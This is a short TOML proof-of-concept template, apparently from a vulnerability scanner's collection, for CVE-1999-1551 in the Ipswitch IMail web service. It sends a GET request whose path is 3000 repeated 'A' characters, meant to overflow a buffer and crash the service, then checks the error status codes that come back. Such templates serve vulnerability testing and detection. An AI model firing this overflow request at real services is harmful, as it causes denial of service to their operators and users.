[info]
author = "ave"
description = "验证Ipswitch IMail Web服务缓冲区溢出漏洞(CVE-1999-1551)，通过向IMail Web服务端口8383发送超长URL（3000字符以上）触发缓冲区溢出，导致服务崩溃拒绝服务"
id = "POC-AVE-1999-1179"
name = "CVE-1999-1551 PoC"
severity = "medium"
tags = ["ave-1999-1179"]
vuln_id = [
    "CVE-1999-1551",
    "AVE-1999-1179",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{repeat('A', 3000)}}/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    400,
    500,
    502,
    503,
]
type = "status"
